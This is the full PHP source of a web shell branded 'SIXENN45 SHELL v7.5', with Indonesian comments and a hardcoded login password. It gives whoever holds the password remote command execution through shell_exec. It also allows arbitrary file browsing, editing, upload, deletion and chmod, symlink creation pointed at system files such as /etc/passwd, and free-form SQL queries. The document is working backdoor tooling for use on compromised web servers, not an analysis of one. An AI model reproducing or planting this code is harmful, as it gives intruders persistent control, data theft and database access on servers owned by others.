<?php
/*
 * SIXENN45 SHELL v7.5 - TANPA SCANNER
 * - Hapus fitur BACKUP di home
 * - Hapus DELETE BY NAME di home
 * - Hapus menu SCANNER dan semua fitur scanner
 * - Perbaikan fitur: Edit, Rename, Chmod, Upload, New File, New Folder
 */

session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

$auth_pass = md5('jinx123');
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
@chdir($current_dir);

// LOGIN
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && md5($_POST['pass']) == $auth_pass) {
        $_SESSION['auth'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body{background:#0a0a0a;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;padding:20px}
            .login-box{background:#111;padding:40px;border:1px solid #0f0;border-radius:10px;max-width:400px;width:100%;text-align:center}
            input[type="password"]{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:12px;width:100%;border-radius:5px;margin-bottom:10px;font-size:16px}
            input[type="submit"]{background:#0f0;color:#000;border:none;padding:12px;font-weight:bold;cursor:pointer;border-radius:5px;width:100%;font-size:16px}
        </style>
        </head><body>
        <div class="login-box">
            <h1>🔐 Login</h1>
            <form method="post"><input type="password" name="pass" placeholder="Password"><br>
            <input type="submit" value="Login"></form>
        </div>
        </body></html>';
        exit;
    }
}

// LOGOUT
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// BREADCRUMB
function getBreadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $html = '<a href="?dir=/">/</a>';
    $current = '';
    foreach ($parts as $p) {
        if (empty($p)) continue;
        $current .= '/' . $p;
        $html .= ' / <a href="?dir=' . urlencode($current) . '">' . htmlspecialchars($p) . '</a>';
    }
    return $html;
}

// ============================================================
// HANDLER: DELETE (SINGLE)
// ============================================================
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file) && is_file($file)) {
        @unlink($file);
    } elseif (file_exists($file) && is_dir($file)) {
        @rmdir($file);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

// ============================================================
// HANDLER: EDIT FILE
// ============================================================
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $fullpath = $current_dir . '/' . $file;
    if (!file_exists($fullpath) || !is_file($fullpath)) {
        header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ File not found");
        exit;
    }

    if (isset($_POST['save'])) {
        $content = $_POST['content'];
        if (@file_put_contents($fullpath, $content) !== false) {
            header("Location: ?dir=" . urlencode($current_dir) . "&msg=✅ File saved");
        } else {
            header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ Failed to save");
        }
        exit;
    }

    $content = file_get_contents($fullpath);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Edit <?php echo htmlspecialchars($file); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
            textarea{width:100%;height:400px;background:#111;color:#0f0;border:1px solid #0f0;padding:10px;font-size:14px}
            input[type="submit"]{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold}
            .back{color:#0ff;border:1px solid #0ff;padding:4px 10px;border-radius:3px;text-decoration:none}
        </style>
    </head>
    <body>
        <h1>✏️ Edit: <?php echo htmlspecialchars($file); ?></h1>
        <form method="post">
            <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
            <br><br>
            <input type="submit" name="save" value="💾 Save">
            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="back">⬅ Back</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// HANDLER: RENAME (FILE & FOLDER)
// ============================================================
if (isset($_GET['rename'])) {
    $oldname = $_GET['rename'];
    $fullpath = $current_dir . '/' . $oldname;
    if (!file_exists($fullpath)) {
        header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ File/Folder not found");
        exit;
    }

    if (isset($_POST['rename_submit'])) {
        $newname = trim($_POST['newname']);
        if (!empty($newname)) {
            $newpath = $current_dir . '/' . $newname;
            if (@rename($fullpath, $newpath)) {
                header("Location: ?dir=" . urlencode($current_dir) . "&msg=✅ Renamed to " . htmlspecialchars($newname));
            } else {
                header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ Rename failed");
            }
        } else {
            header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ Name cannot be empty");
        }
        exit;
    }

    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Rename <?php echo htmlspecialchars($oldname); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
            input[type="text"]{background:#111;color:#0f0;border:1px solid #0f0;padding:8px;width:300px}
            input[type="submit"]{background:#0f0;color:#000;border:none;padding:8px 20px;cursor:pointer;font-weight:bold}
            .back{color:#0ff;border:1px solid #0ff;padding:4px 10px;border-radius:3px;text-decoration:none}
        </style>
    </head>
    <body>
        <h1>📝 Rename: <?php echo htmlspecialchars($oldname); ?></h1>
        <form method="post">
            <input type="text" name="newname" value="<?php echo htmlspecialchars($oldname); ?>">
            <input type="submit" name="rename_submit" value="Rename">
            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="back">⬅ Back</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// HANDLER: CHMOD (FILE & FOLDER)
// ============================================================
if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    $fullpath = $current_dir . '/' . $file;
    if (!file_exists($fullpath)) {
        header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ File/Folder not found");
        exit;
    }

    if (isset($_POST['chmod_submit'])) {
        $perm = trim($_POST['permission']);
        if (preg_match('/^[0-7]{3,4}$/', $perm)) {
            $mode = octdec($perm);
            if (@chmod($fullpath, $mode)) {
                header("Location: ?dir=" . urlencode($current_dir) . "&msg=✅ Chmod to " . $perm);
            } else {
                header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ Chmod failed");
            }
        } else {
            header("Location: ?dir=" . urlencode($current_dir) . "&msg=❌ Invalid permission format (e.g., 0644)");
        }
        exit;
    }

    $current_perm = fileperms($fullpath) ? substr(sprintf('%o', fileperms($fullpath)), -4) : '????';
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Chmod <?php echo htmlspecialchars($file); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
            input[type="text"]{background:#111;color:#0f0;border:1px solid #0f0;padding:8px;width:100px}
            input[type="submit"]{background:#0f0;color:#000;border:none;padding:8px 20px;cursor:pointer;font-weight:bold}
            .back{color:#0ff;border:1px solid #0ff;padding:4px 10px;border-radius:3px;text-decoration:none}
        </style>
    </head>
    <body>
        <h1>🔧 Chmod: <?php echo htmlspecialchars($file); ?></h1>
        <p>Current permission: <strong><?php echo $current_perm; ?></strong></p>
        <form method="post">
            <input type="text" name="permission" value="<?php echo $current_perm; ?>" placeholder="0644">
            <input type="submit" name="chmod_submit" value="Apply">
            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="back">⬅ Back</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// HANDLER: VIEW FILE
// ============================================================
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        echo '<!DOCTYPE html><html><head><title>View</title></head><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">';
        echo '<h3>📄 ' . htmlspecialchars(basename($file)) . '</h3>';
        echo '<pre>' . htmlspecialchars(file_get_contents($file)) . '</pre>';
        echo '<a href="?dir=' . urlencode($current_dir) . '">⬅ Back</a>';
        echo '</body></html>';
        exit;
    }
}

// ============================================================
// HANDLER: DOWNLOAD
// ============================================================
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// ============================================================
// MAIN SHELL (HOME) — TANPA SCANNER
// ============================================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>SIXENN45 SHELL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{font-family:monospace;background:#111;color:#0f0;margin:20px;font-size:14px}
        a{color:#0ff;text-decoration:none}
        input,textarea,select{background:#222;color:#0f0;border:1px solid #0f0;padding:5px}
        .menu{background:#1a1a1a;padding:10px;margin:10px 0}
        .menu a{color:#0ff;padding:4px 10px;border:1px solid #0ff;border-radius:3px;display:inline-block;margin:2px;font-size:12px}
        .menu a:hover{background:#0ff;color:#000}
        .menu a.danger{color:#f00;border-color:#f00}
        .menu a.danger:hover{background:#f00;color:#fff}
        .path{background:#000;padding:10px;margin:10px 0;border:1px solid #333}
        .danger-btn{background:#f00;color:#fff;border:none;padding:8px 15px;border-radius:5px;cursor:pointer;font-weight:bold}
        .danger-btn:hover{background:#c00}
        .action-box{background:#000;padding:10px;margin:10px 0;border:1px solid #0f0}
        .action-box input,.action-box textarea{width:100%;margin:5px 0}
        .action-box input[type="submit"]{background:#0f0;color:#000;border:none;padding:6px 12px;cursor:pointer;font-weight:bold;width:auto}
        .success-box{background:#002200;padding:15px;margin:10px 0;border:1px solid #0f0}
        table{width:100%;border-collapse:collapse;margin-top:10px;font-size:13px}
        th{background:#1a1a1a;color:#0f0;padding:5px;text-align:left;border-bottom:2px solid #0f0}
        td{padding:5px;border-bottom:1px solid #222}
        tr:hover{background:#111}
        .footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
        @media (max-width:600px){body{margin:10px;font-size:12px}table{font-size:11px}}
    </style>
</head>
<body>

<h1>☠ SHELL by SIXENN45</h1>

<div class="path">
    <strong>📁 Path:</strong> <?php echo getBreadcrumb($current_dir); ?>
</div>

<div class="menu">
    <a href="?dir=<?php echo urlencode($current_dir); ?>&action=upload">📤 Upload</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&action=newfile">📄 New File</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&action=newfolder">📁 New Folder</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&action=terminal">💻 Terminal</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&action=symlink">🔗 Symlink</a>
    <a href="?dir=<?php echo urlencode($current_dir); ?>&action=sql">🗃️ SQL</a>
    <a href="?logout" class="danger">🚪 Logout</a>
</div>

<?php if(isset($_GET['msg'])): ?>
    <div class="success-box" style="<?php echo strpos($_GET['msg'], '❌')!==false?'border-color:#f00;background:#1a0000;':''; ?>">
        <?php echo htmlspecialchars($_GET['msg']); ?>
    </div>
<?php endif; ?>

<?php if(isset($_GET['action'])): ?>
<div class="action-box">
<?php switch($_GET['action']):
    case 'upload': ?>
        <h3>📤 Upload</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" name="upload" value="Upload">
        </form>
        <?php if(isset($_FILES['file'])): 
            $target = $current_dir . '/' . basename($_FILES['file']['name']);
            if(@move_uploaded_file($_FILES['file']['tmp_name'], $target)) echo '<p style="color:#0f0;">✅ Uploaded</p>';
            else echo '<p style="color:#f00;">❌ Failed</p>';
        endif; ?>
        <?php break;
    case 'newfile': ?>
        <h3>📄 New File</h3>
        <form method="post">
            <input type="text" name="filename" placeholder="Filename">
            <textarea name="content" rows="5"></textarea>
            <input type="submit" name="create" value="Create">
        </form>
        <?php if(isset($_POST['create'])): 
            $file = $current_dir . '/' . $_POST['filename'];
            if(@file_put_contents($file, $_POST['content']) !== false) echo '<p style="color:#0f0;">✅ Created</p>';
            else echo '<p style="color:#f00;">❌ Failed</p>';
        endif; ?>
        <?php break;
    case 'newfolder': ?>
        <h3>📁 New Folder</h3>
        <form method="post">
            <input type="text" name="foldername" placeholder="Folder name">
            <input type="submit" name="create" value="Create">
        </form>
        <?php if(isset($_POST['create'])): 
            if(@mkdir($current_dir . '/' . $_POST['foldername'], 0755)) echo '<p style="color:#0f0;">✅ Created</p>';
            else echo '<p style="color:#f00;">❌ Failed</p>';
        endif; ?>
        <?php break;
    case 'terminal': ?>
        <h3>💻 Terminal</h3>
        <form method="post">
            <input type="text" name="cmd" placeholder="Command" style="width:80%;">
            <input type="submit" value="Execute">
        </form>
        <?php if(isset($_POST['cmd'])): 
            $output = shell_exec($_POST['cmd'] . ' 2>&1');
            echo '<pre style="background:#000;padding:10px;overflow:auto;max-height:300px;">' . htmlspecialchars($output) . '</pre>';
        endif; ?>
        <?php break;
    case 'symlink': ?>
        <h3>🔗 Symlink</h3>
        <form method="post">
            <input type="text" name="target" placeholder="/etc/passwd">
            <input type="text" name="linkname" placeholder="link_name">
            <input type="submit" name="create" value="Create">
        </form>
        <?php if(isset($_POST['create'])): 
            if(@symlink($_POST['target'], $current_dir . '/' . $_POST['linkname'])) echo '<p style="color:#0f0;">✅ Created</p>';
            else echo '<p style="color:#f00;">❌ Failed</p>';
        endif; ?>
        <?php break;
    case 'sql': ?>
        <h3>🗃️ SQL</h3>
        <form method="post">
            <input type="text" name="sql_host" placeholder="Host" value="localhost">
            <input type="text" name="sql_user" placeholder="User">
            <input type="password" name="sql_pass" placeholder="Password">
            <input type="text" name="sql_db" placeholder="Database">
            <textarea name="sql_query" rows="3"></textarea>
            <input type="submit" name="sql_exec" value="Execute">
        </form>
        <?php if(isset($_POST['sql_exec'])): 
            $conn = @mysqli_connect($_POST['sql_host'], $_POST['sql_user'], $_POST['sql_pass'], $_POST['sql_db']);
            if($conn) {
                $res = @mysqli_query($conn, $_POST['sql_query']);
                if($res) {
                    if(is_bool($res)) echo '<p style="color:#0f0;">✅ Query executed (no result set)</p>';
                    else {
                        echo '<table style="background:#000;border-collapse:collapse;width:100%;">';
                        echo '<tr>';
                        while($field = mysqli_fetch_field($res)) echo '<th style="border:1px solid #0f0;padding:5px;">' . htmlspecialchars($field->name) . '</th>';
                        echo '</tr>';
                        while($row = mysqli_fetch_assoc($res)) {
                            echo '<tr>';
                            foreach($row as $col) echo '<td style="border:1px solid #222;padding:5px;">' . htmlspecialchars($col) . '</td>';
                            echo '</tr>';
                        }
                        echo '</table>';
                    }
                } else echo '<p style="color:#f00;">❌ Query error: ' . htmlspecialchars(mysqli_error($conn)) . '</p>';
                @mysqli_close($conn);
            } else echo '<p style="color:#f00;">❌ Connection failed</p>';
        endif; ?>
        <?php break;
endswitch; ?>
</div>
<?php endif; ?>

<h3>📂 Directory Contents</h3>
<table>
<tr><th>Name</th><th>Size</th><th>Perm</th><th>Modified</th><th>Action</th></tr>
<?php
$files = @scandir($current_dir);
if($files) {
    foreach($files as $file) {
        if($file == '.') continue;
        $path = $current_dir . '/' . $file;
        $is_dir = @is_dir($path);
        if($file == '..') {
            echo '<tr><td colspan="5"><a href="?dir=' . urlencode(dirname($current_dir)) . '">⬆️ [UP]</a></td></tr>';
            continue;
        }
        $size = $is_dir ? 'DIR' : (@filesize($path) ?: '0') . ' bytes';
        $perms = @fileperms($path) ? substr(sprintf('%o', @fileperms($path)), -4) : '????';
        $modified = @filemtime($path) ? date('Y-m-d H:i', @filemtime($path)) : 'Unknown';
        echo '<tr>';
        echo '<td>' . ($is_dir ? '📁 ' : '📄 ') . '<a href="' . ($is_dir ? '?dir=' . urlencode($path) : '?view=' . urlencode($path) . '&dir=' . urlencode($current_dir)) . '">' . htmlspecialchars($file) . '</a></td>';
        echo '<td>' . $size . '</td>';
        echo '<td>' . $perms . '</td>';
        echo '<td>' . $modified . '</td>';
        echo '<td>';
        if(!$is_dir) {
            echo '<a href="?edit=' . urlencode($file) . '&dir=' . urlencode($current_dir) . '">✏️</a> ';
            echo '<a href="?rename=' . urlencode($file) . '&dir=' . urlencode($current_dir) . '">📝</a> ';
            echo '<a href="?chmod=' . urlencode($file) . '&dir=' . urlencode($current_dir) . '">🔧</a> ';
            echo '<a href="?delete=' . urlencode($path) . '&dir=' . urlencode($current_dir) . '">🗑️</a> ';
            echo '<a href="?download=' . urlencode($path) . '">⬇️</a>';
        } else {
            echo '<a href="?rename=' . urlencode($file) . '&dir=' . urlencode($current_dir) . '">📝</a> ';
            echo '<a href="?chmod=' . urlencode($file) . '&dir=' . urlencode($current_dir) . '">🔧</a> ';
            echo '<a href="?delete=' . urlencode($path) . '&dir=' . urlencode($current_dir) . '">🗑️</a>';
        }
        echo '</td></tr>';
    }
} else {
    echo '<tr><td colspan="5">Cannot read directory</td></tr>';
}
?>
</table>

<div class="footer">☠️ Created By SIXENN45 | v7.5 - Tanpa Scanner</div>

</body>
</html>